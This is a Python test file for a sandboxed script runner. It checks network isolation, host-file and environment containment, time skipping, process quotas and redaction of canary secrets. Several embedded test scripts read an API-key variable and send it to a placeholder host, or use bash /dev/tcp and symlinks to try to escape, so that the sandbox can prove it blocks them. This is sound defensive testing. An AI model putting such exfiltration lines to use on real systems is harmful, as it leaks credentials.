import json
import os
from pathlib import Path
import socket
import sys
import tempfile
import textwrap
import time
import uuid


sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import runner
from differ import compare_with_lockfile
from isolation import IsolationError, _quota_parent, preflight, process_quota
from lockfile import build_lock_data


def script(folder, code):
    path = Path(folder, "sample.py")
    path.write_text(textwrap.dedent(code), encoding="utf-8")
    return path


def test_preflight_and_normal_run():
    assert preflight()[0].endswith("bwrap")
    with tempfile.TemporaryDirectory() as temp:
        path = script(temp, """
            import os, time, urllib.request
            os.environ['OPENAI_API_KEY']
            with open('.env') as fp:
                fp.read()
            try:
                urllib.request.urlopen('https://example.invalid/?key=' +
                    os.environ['OPENAI_API_KEY'], timeout=0.1)
            except PermissionError:
                pass
            time.sleep(3600)
            print('done')
        """)
        result = runner.run_in_sandbox(path, offset_hours=72)
        assert result["complete"], result["stderr"]
        assert result["backend"] == "bubblewrap" and result["network_isolated"]
        assert result["virtual_elapsed_sec"] >= 73 * 3600
        assert result["summary"]["env_vars_read"]
        assert result["summary"]["network_attempts"]
        assert "OPENAI_API_KEY" in result["summary"]["observed_canaries"]
        assert result["summary"]["sleeps_skipped"]["count"] == 1


def test_host_files_environment_and_symlinks():
    with tempfile.TemporaryDirectory() as temp:
        base = Path(temp)
        source = base / "source"
        source.mkdir()
        marker = base / "host-only.txt"
        marker.write_text("HOST-MARKER-SECRET", encoding="utf-8")
        real_env = source / ".env"
        real_env.write_text("HOST_ENV=real\n", encoding="utf-8")
        (source / "escape").symlink_to(marker)
        path = script(source, f"""
            import os
            assert 'HOST_CREDENTIAL' not in os.environ
            assert not os.path.exists({str(marker)!r})
            assert not os.path.exists('escape')
            with open('.env') as fp:
                assert 'HOST_ENV=real' not in fp.read()
            with open('sample.py', 'a') as fp:
                fp.write('# stage only\\n')
            print('contained')
        """)
        original = path.read_bytes()
        before = path.stat().st_mtime_ns
        os.environ["HOST_CREDENTIAL"] = "HOST-CREDENTIAL-SECRET"
        try:
            result = runner.run_in_sandbox(path, backdate_mtime_hours=24)
        finally:
            del os.environ["HOST_CREDENTIAL"]
        assert result["complete"], result["stderr"]
        assert result["stdout"].strip() == "contained"
        assert path.read_bytes() == original and path.stat().st_mtime_ns == before
        assert marker.read_text() == "HOST-MARKER-SECRET"
        assert real_env.read_text() == "HOST_ENV=real\n"


def test_unhooked_children_and_private_network():
    with tempfile.TemporaryDirectory() as temp:
        base = Path(temp)
        marker = base / "host-only.txt"
        marker.write_text("SECRET", encoding="utf-8")
        source = base / "source"
        source.mkdir()
        with socket.socket() as listener:
            listener.bind(("127.0.0.1", 0))
            listener.listen(1)
            port = listener.getsockname()[1]
            path = script(source, f"""
                import ctypes, subprocess, sys
                code = "import os,socket; assert not os.path.exists({str(marker)!r}); " + \\
                        "s=socket.socket(); assert s.connect_ex(('127.0.0.1', {port})) != 0"
                subprocess.run([sys.executable, '-S', '-c', code], check=True)
                subprocess.run(['/bin/bash', '-c', 'test ! -e {marker}'], check=True)
                net = subprocess.run(['/bin/bash', '-c',
                    'echo hi > /dev/tcp/127.0.0.1/{port}'], capture_output=True)
                assert net.returncode != 0
                libc = ctypes.CDLL(None)
                assert libc.open({str(marker)!r}.encode(), 0) == -1
                print('children contained')
            """)
            result = runner.run_in_sandbox(path, block_net=False)
        assert result["complete"], result["stderr"]
        assert "children contained" in result["stdout"]
        assert marker.read_text() == "SECRET"


def test_timeout_and_cleanup():
    with tempfile.TemporaryDirectory() as temp:
        quota_parent = _quota_parent()
        before_groups = set(quota_parent.glob("waketrace-*")) if quota_parent else set()
        token = "phase5-" + uuid.uuid4().hex
        path = script(temp, f"""
            import signal, subprocess, sys
            code = "import subprocess,sys,time; " + \\
                   "subprocess.Popen([sys.executable, '-S', '-c', 'import time; time.sleep(60)',{token!r}]); " + \\
                   "time.sleep(60)"
            subprocess.Popen([sys.executable, '-S', '-c', code, {token!r}])
            signal.pause()
        """)
        before = path.stat().st_mtime_ns
        result = runner.run_in_sandbox(path, timeout_sec=0.7, backdate_mtime_hours=24)
        assert result["timed_out"] and not result["complete"]
        assert path.stat().st_mtime_ns == before
        time.sleep(0.1)
        for proc in Path("/proc").glob("[0-9]*/cmdline"):
            try:
                cmdline = proc.read_bytes()
            except OSError:
                continue
            assert token.encode() not in cmdline, f"child remained: {proc}"
        if quota_parent:
            assert set(quota_parent.glob("waketrace-*")) == before_groups


def test_private_cgroup_process_quota():
    with process_quota(8) as group:
        if group is not None:
            assert (group / "pids.max").read_text().strip() == "8"
    if group is not None:
        assert not group.exists()
    with tempfile.TemporaryDirectory() as temp:
        path = script(temp, """
            import subprocess, sys
            children = []
            for _ in range(20):
                try:
                    children.append(subprocess.Popen(
                        [sys.executable, '-S', '-c', 'import signal; signal.pause()']))
                except OSError:
                    print('quota reached', len(children))
                    break
            else:
                print('all children started')
        """)
        result = runner.run_in_sandbox(path, process_limit=8, timeout_sec=3)
        if group is not None:
            assert result["complete"], result["stderr"]
            assert result["process_limit_mode"] == "private_cgroup_v2"
            assert "quota reached" in result["stdout"]
        else:
            assert result["process_limit_mode"] == "user_rlimit_nproc"


def test_missing_trace_and_backend_fail_closed():
    with tempfile.TemporaryDirectory() as temp:
            path = script(temp, "open('/trace/events.jsonl', 'w').close()\n")
            result = runner.run_in_sandbox(path)
            assert not result["complete"]
            assert "trace" in result["error"]
            try:
                build_lock_data(result)
            except ValueError:
                pass
            else:
                raise AssertionError("incomplete result became a lockfile")
            original = runner.preflight
            runner.preflight = lambda: (_ for _ in ()).throw(IsolationError("backend unavailable"))
            try:
                try:
                    runner.run_in_sandbox(path)
                except IsolationError as exc:
                    assert "backend unavailable" in str(exc)
                else:
                    raise AssertionError("runner fell back to direct execution")
            finally:
                runner.preflight = original


def test_reports_redact_canaries():
    with tempfile.TemporaryDirectory() as temp:
        path = script(temp, """
            import os, urllib.request
            value = os.environ['OPENAI_API_KEY']
            print(value)
            try:
                urllib.request.urlopen('https://example.invalid/?key=' + value)
            except PermissionError:
                pass
        """)
        secret = "sk-proj-wake-TESTSECRET123"
        result = runner.run_in_sandbox(path, custom_canaries={"OPENAI_API_KEY": secret})
        assert result["complete"], result["stderr"]
        assert secret not in json.dumps(result)
        assert result["summary"]["observed_canaries"] == ["OPENAI_API_KEY"]
        lock = build_lock_data(result, project_root=temp)
        runs = {"target_script": str(path), "horizons_tested": [0], "runs": {"0": result}}
        report_path = Path(temp, "report.json")
        compare_with_lockfile(lock, runs, report_out_path=report_path)
        assert secret not in report_path.read_text(encoding="utf-8")


def test_write_limit_rejects_large_output():
    with tempfile.TemporaryDirectory() as temp:
        path = script(temp, "with open('large.bin', 'wb') as fp: fp.write(b'x' * 3_000_000)\n")
        result = runner.run_in_sandbox(path, write_limit_mb=1)
        assert not result["complete"]
        assert result["exit_code"] != 0
        assert not Path(temp, "large.bin").exists()


if __name__ == "__main__":
    tests = (test_preflight_and_normal_run, test_host_files_environment_and_symlinks,
             test_unhooked_children_and_private_network, test_timeout_and_cleanup,
             test_private_cgroup_process_quota,
             test_missing_trace_and_backend_fail_closed, test_reports_redact_canaries,
             test_write_limit_rejects_large_output)
    failed = 0
    for test in tests:
        try:
            test()
            print(f"PASS: {test.__name__}")
        except Exception as exc:
            failed += 1
            print(f"FAIL: {test.__name__}: {exc}")
    raise SystemExit(bool(failed))
